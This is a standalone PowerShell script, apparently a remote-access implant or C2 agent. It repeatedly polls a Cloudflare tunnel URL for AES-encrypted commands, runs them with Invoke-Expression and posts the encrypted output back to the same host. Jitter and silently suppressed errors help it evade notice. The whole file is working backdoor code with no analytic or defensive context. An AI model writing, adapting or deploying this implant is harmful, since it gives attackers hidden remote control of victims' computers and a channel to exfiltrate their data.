$C2_URL = "https://brought-demographic-quantitative-legs.trycloudflare.com"
$Key = [System.Text.Encoding]::UTF8.GetBytes("1234567890123456")
$IV = [System.Text.Encoding]::UTF8.GetBytes("1234567890123456")

function Decrypt-Command ($cipherText) {
    $aes = [System.Security.Cryptography.Aes]::Create()
    $aes.Key = $Key
    $aes.IV = $IV
    $aes.Mode = [System.Security.Cryptography.CipherMode]::CBC
    $aes.Padding = [System.Security.Cryptography.PaddingMode]::PKCS7

    $decryptor = $aes.CreateDecryptor()
    $bytes = [System.Convert]::FromBase64String($cipherText)
    $decryptedBytes = $decryptor.TransformFinalBlock($bytes, 0, $bytes.Length)
    return [System.Text.Encoding]::UTF8.GetString($decryptedBytes)
}

function Encrypt-Result ($plainText) {
    $aes = [System.Security.Cryptography.Aes]::Create()
    $aes.Key = $Key
    $aes.IV = $IV
    $aes.Mode = [System.Security.Cryptography.CipherMode]::CBC
    $aes.Padding = [System.Security.Cryptography.PaddingMode]::PKCS7

    $encryptor = $aes.CreateEncryptor()
    $bytes = [System.Text.Encoding]::UTF8.GetBytes($plainText)
    $encryptedBytes = $encryptor.TransformFinalBlock($bytes, 0, $bytes.Length)
    return [System.Convert]::ToBase64String($encryptedBytes)
}

while($true) {
    try {
        $response = Invoke-RestMethod -Uri "$C2_URL/tasks" -Method Get -ErrorAction Stop
        $cmd = Decrypt-Command $response

        if ($cmd -ne "IDLE") {
            $result = Invoke-Expression $cmd | Out-String
            if ([string]::IsNullOrWhiteSpace($result)) { $result = "[Comando ejecutado con éxito, sin salida de texto]" }
            $encryptedResult = Encrypt-Result $result
            Invoke-RestMethod -Uri "$C2_URL/results" -Method Post -Body $encryptedResult -ContentType "text/plain" -ErrorAction Stop
        }
    } catch {
        # Silencio 
    }
    $RandomJitter = Get-Random -Minimum -1 -Maximum 2
    $SleepTime = 5 + $RandomJitter
    Start-Sleep -Seconds $SleepTime
}
